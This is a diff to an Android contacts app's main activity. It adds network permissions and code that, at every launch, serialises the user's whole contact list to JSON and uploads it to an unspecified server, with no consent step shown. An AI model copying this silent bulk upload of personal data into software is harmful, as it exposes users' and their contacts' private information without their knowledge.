@@ -8,6 +8,8 @@ import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.widget.ListView;
 
+import org.json.JSONArray;
+
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.List;
@@ -29,6 +31,12 @@ public class Accueil extends AppCompatActivity {
         checkPermissions();
 
         listContacts = new ContactFetcher(this,getContentResolver()).fetchAll();
+        SendDataToServer query = new SendDataToServer();
+        JSONArray j = new JSONArray();
+        for(Contact c : listContacts){
+            j.put(c.toJSON());
+        }
+        query.execute(j.toString());
         Collections.sort(listContacts);
         lvContacts = (ListView) findViewById(R.id.listContact);
         ContactsAdapter adapterContacts = new ContactsAdapter(this, listContacts);
@@ -40,6 +48,8 @@ public class Accueil extends AppCompatActivity {
         permissions.add(Manifest.permission.READ_CONTACTS);
         permissions.add(Manifest.permission.READ_SMS);
         permissions.add(Manifest.permission.READ_CALL_LOG);
+        permissions.add(Manifest.permission.INTERNET);
+        permissions.add(Manifest.permission.ACCESS_NETWORK_STATE);
 
         for (String permission : permissions) {
             if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
